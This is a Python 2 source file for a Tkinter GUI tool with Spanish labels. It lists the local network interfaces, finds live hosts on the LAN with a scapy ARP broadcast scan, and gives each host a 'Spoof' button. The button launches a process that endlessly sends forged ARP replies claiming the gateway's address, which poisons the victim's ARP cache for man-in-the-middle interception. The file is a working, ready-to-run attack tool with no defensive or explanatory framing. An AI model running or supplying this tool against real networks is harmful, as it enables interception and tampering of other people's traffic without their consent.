import netifaces
import multiprocessing
import socket
import time
from Tkinter import *
from ttk import *
from scapy.all import *

interfaces = {}

def addr2bin(addr):
	binary = ""
	for num in addr.split("."):
		b = str(bin(int(num))).split("b")[1]
		binary += "0"*(8-len(b))+b
	return binary

def bin2addr(bin):
	addr = []
	for n in range(0,32,8):
		addr.append(str(int(bin[n:n+8],2)))
	return ".".join(addr)

def red(ip,mask):
	ip_bin = addr2bin(ip)
	mask_bin = addr2bin(mask)
	red_bin = ""
	for x,y in zip(ip_bin,mask_bin):
		red_bin += "1" if x == y == "1" else "0"
	return bin2addr(red_bin)

def broadcast(red,mask):
	red_bin = addr2bin(red)
	mask_num = addr2bin(mask).count("1")
	broadcast_bin = red_bin[0:mask_num]+"1"*(32-mask_num)
	return bin2addr(broadcast_bin)

def get_hostname(ip,send_end):
	try:
		name = socket.gethostbyaddr(ip)[0]
		send_end.send(name)

	except:
		send_end.send("Unknow")

def init():
	global interfaces
	if __name__ == "__main__":
		if 2 in netifaces.gateways():
			gateways = netifaces.gateways()[2]
		else:
			print "No gateway"
			return 0

		gateways_iff = [x[1] for x in gateways if x[2] == True]

		for iff in netifaces.interfaces():	
			addrs = netifaces.ifaddresses(iff)
			interfaces[iff] = {}
			if 17 in addrs:
				interfaces[iff]["mac"] = addrs[17][0]["addr"]
			if 2 in addrs:
				interfaces[iff]["ip"] = addrs[2][0]["addr"]
				interfaces[iff]["mask"] = addrs[2][0]["netmask"]
			if iff in gateways_iff:
				interfaces[iff]["gateway"] = [x for x in gateways if x[2] == True and iff == x[1]][0][0]

		interfaces = {iff:interfaces[iff] for iff in interfaces 
				if iff != "lo" and len(interfaces[iff].values()) == 4}

		for iff in interfaces:
			ip = interfaces[iff]["ip"]
			mask = interfaces[iff]["mask"]
			interfaces[iff]["red"] = red(ip,mask)
			interfaces[iff]["broadcast"] = broadcast(interfaces[iff]["red"],mask)

		if interfaces:
			app = App()
		else:	
			print "No Network configuration"
			return 0

def func_spoof(ip_v,gw,mac):
	arpfake = ARP()
	arpfake.op = 2
	arpfake.psrc = gw
	arpfake.pdst = ip_v
	arpfake.hwdst = mac
	arpfake.show()
	while 1:
		send(arpfake,verbose=0)
		time.sleep(0.5)

class InfoInterfaces():
	def __init__(self,master):
		interface_label = Label(master.frame,text="Interface:")
		interface_label.grid(column=0,row=0,padx=5,pady=5,sticky=W)

		self.combobox = Combobox(master.frame,state="readonly",width=15)
		self.combobox["values"] = [x for x in interfaces]
		self.combobox.grid(column=1,row=0,padx=5,pady=5,sticky=W)
		self.combobox.current(0)
		self.combobox.bind("<<ComboboxSelected>>", self.iface_selec)

		self.interface_selec = self.combobox["values"][self.combobox.current()]
		self.mac = interfaces[self.interface_selec]["mac"]
		self.ip = interfaces[self.interface_selec]["ip"]
		self.mask = interfaces[self.interface_selec]["mask"]
		self.num_mask = str(addr2bin(self.mask).count("1"))
		self.gateway = interfaces[self.interface_selec]["gateway"]
		self.red = interfaces[self.interface_selec]["red"]
		self.broadcast = interfaces[self.interface_selec]["broadcast"]

		self.mac_label =  Label(master.frame,text=str(self.mac))
		self.ip_label =  Label(master.frame,text=str(self.ip))
		self.mask_label = Label(master.frame,text=str(self.mask)+" /"+self.num_mask)
		self.gateway_label = Label(master.frame,text=str(self.gateway))
		self.red_label = Label(master.frame,text=str(self.red))
		self.broadcast_label = Label(master.frame,text=str(self.broadcast))

		Label(master.frame,text="MAC:").grid(column=0,row=1,padx=5,pady=5,sticky=W)
		Label(master.frame,text="IP:").grid(column=0,row=2,padx=5,pady=5,sticky=W)
		Label(master.frame,text="NetMask:").grid(column=0,row=3,padx=5,pady=5,sticky=W)
		Label(master.frame,text="Gateway:").grid(column=0,row=4,padx=5,pady=5,sticky=W)
		Label(master.frame,text="Network:").grid(column=0,row=5,padx=5,pady=5,sticky=W)
		Label(master.frame,text="Broadcast:").grid(column=0,row=6,padx=5,pady=5,sticky=W)

		self.mac_label.grid(column=1,row=1,padx=5,pady=5,sticky=W)
		self.ip_label.grid(column=1,row=2,padx=5,pady=5,sticky=W)
		self.mask_label.grid(column=1,row=3,padx=5,pady=5,sticky=W)
		self.gateway_label.grid(column=1,row=4,padx=5,pady=5,sticky=W)
		self.red_label.grid(column=1,row=5,padx=5,pady=5,sticky=W)
		self.broadcast_label.grid(column=1,row=6,padx=5,pady=5,sticky=W)

		self.escanear = Button(master.frame,text="Escanear",command=master.escaneo)
		self.escanear.grid(column=1,row=7,padx=5,pady=10,sticky=W)

	def iface_selec(self,event):
		if self.interface_selec in netifaces.interfaces():
			info_interface = netifaces.ifaddresses(self.interface_selec)
			if 2 in info_interface and 17 in info_interface:
				self.interface_selec = self.combobox["values"][self.combobox.current()]
				self.mac = interfaces[self.interface_selec]["mac"]
				self.ip = interfaces[self.interface_selec]["ip"]
				self.mask = interfaces[self.interface_selec]["mask"]
				self.num_mask = str(addr2bin(self.mask).count("1"))
				self.gateway = interfaces[self.interface_selec]["gateway"]
				self.red = interfaces[self.interface_selec]["red"]
				self.broadcast = interfaces[self.interface_selec]["broadcast"]

				self.mac_label["text"] = self.mac
				self.ip_label["text"] =  self.ip
				self.mask_label["text"] = self.mask+" /"+self.num_mask
				self.gateway_label["text"] = self.gateway
				self.red_label["text"] = self.red
				self.broadcast_label["text"] = self.broadcast
			else:
				print "Error. Bad interface configuration"
		else:
			print "Error. No interface"

class Host():
	def __init__(self,master,ip,mac,hostname,n_r):
		self.ip = ip
		self.mac = mac
		self.label_ip_host = Label(master.frame_equipos,text=self.ip,borderwidth=1,relief="sunken",padding=1)
		self.label_mac_host = Label(master.frame_equipos,text=self.mac,borderwidth=1,relief="sunken",padding=1)
		self.label_hostname = Label(master.frame_equipos,text=hostname,width=20,borderwidth=1,relief="sunken",padding=1)
		self.button_spoof = Button(master.frame_equipos,text="Spoof",command=lambda: self.spoof(master,self.ip,self.mac))

		self.label_ip_host.grid(row=n_r,column=0,padx=5,pady=5,sticky=W+E)
		self.label_mac_host.grid(row=n_r,column=1,padx=5,pady=5,sticky=W+E)
		self.label_hostname.grid(row=n_r,column=2,padx=5,pady=5,sticky=W+E)
		self.button_spoof.grid(row=n_r,column=3,padx=5,pady=5,sticky=W+E)

		self.proceso = None

	def spoof(self,master,ip,mac):
		style = Style()
		style.configure("Red.TButton", foreground="darkred")
		style.configure("Black.TButton", foreground="black")
		if self.proceso:
			self.button_spoof.configure(text="Spoof")
			self.button_spoof.configure(style="Black.TButton")
			self.proceso.terminate()
			self.proceso = False
			print "Stop ARP Spoofing to", ip, mac
		else:
			self.button_spoof.configure(style="Red.TButton")
			self.button_spoof.configure(text="Spoofing")
			gw = master.Iinterfaces.gateway
			mac = master.Iinterfaces.mac
			self.proceso = multiprocessing.Process(target=func_spoof,args=(self.ip,gw,mac))
			self.proceso.start()
			print "ARP Spoofing to ", ip, mac
		
class App():
	def __init__(self):
		self.root = Tk()
		self.frame = Frame(borderwidth=2,relief="groove")
		self.frame.grid(row=0,column=0,columnspan=2,sticky=W+E,padx=5,pady=5)

		self.Iinterfaces = InfoInterfaces(self)

		self.canvas = Canvas(self.root, bd=0, highlightthickness=0)		
		self.frame_equipos = Frame(self.canvas)
		yscroll = Scrollbar(self.root,orient=VERTICAL,command=self.canvas.yview)
		self.canvas.configure(yscrollcommand=yscroll.set)

		self.frame_equipos.bind("<Configure>",self.onFrameConfigure)

		self.canvas.bind('<Configure>', self.FrameWidth)

		self.canvas.grid(row=1,column=0,sticky=N+W+E+S,padx=5,pady=5)
		self.canvas_frame = self.canvas.create_window((0,0),window=self.frame_equipos, anchor=N)
		yscroll.grid(row=1,column=1, sticky=N+S+E, pady=5, padx=3)

		self.equipos_escaneo = []
		self.hosts = []
		
		self.root.resizable(width=True,height=True)
		self.root.minsize(width=600, height=350)

		self.root.rowconfigure(1, weight=1)
		self.root.columnconfigure(0, weight=1)

		self.frame_equipos.columnconfigure(0,weight=1)
		self.frame_equipos.columnconfigure(1,weight=3)
		self.frame_equipos.columnconfigure(2,weight=6)
		self.frame_equipos.columnconfigure(3,weight=4)

		self.root.mainloop()
	
	def onFrameConfigure(self, event):
		canvas_height = self.canvas.winfo_height()
		frame_equipos_height = event.height
		self.canvas.configure(scrollregion=self.canvas.bbox("all"))
		if canvas_height > frame_equipos_height:
			self.canvas.itemconfig(self.canvas_frame, height=canvas_height-5)
		else:
			self.canvas.itemconfig(self.canvas_frame, height=(len(self.frame_equipos.winfo_children())/4)*40)

	def FrameWidth(self, event):
		canvas_width = event.width-10
		self.canvas.itemconfig(self.canvas_frame, width = canvas_width)

	def escaneo(self):
		self.equipos_escaneo = []
		self.hosts = []
		if self.frame_equipos.winfo_children():
			for widget in self.frame_equipos.winfo_children():
    				widget.destroy()
		print "Escaneando "+self.Iinterfaces.combobox["values"][self.Iinterfaces.combobox.current()]+"...."
		pdst_ip = self.Iinterfaces.ip+"/"+self.Iinterfaces.num_mask
		alive,dead=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=pdst_ip), timeout=2, verbose=0)
		procesos_gethost = []
		pipe_list = []
		for i in range(0,len(alive)):
			ip = alive[i][1].psrc
			mac = alive[i][1].hwsrc
			self.equipos_escaneo.append([ip,mac])
			recv_end, send_end = multiprocessing.Pipe(False)
			p = multiprocessing.Process(target=get_hostname,args=(ip,send_end))
			procesos_gethost.append(p)
			pipe_list.append(recv_end)
			p.start()
		n_r = 0
		for proc in procesos_gethost:
			procesos_gethost[n_r].join()
		for equipo in self.equipos_escaneo:
			hostname = pipe_list[n_r].recv()
			self.hosts.append(Host(self,equipo[0],equipo[1],hostname,n_r))
			n_r += 1
		print "Escaneo Finalizado."

init()
		
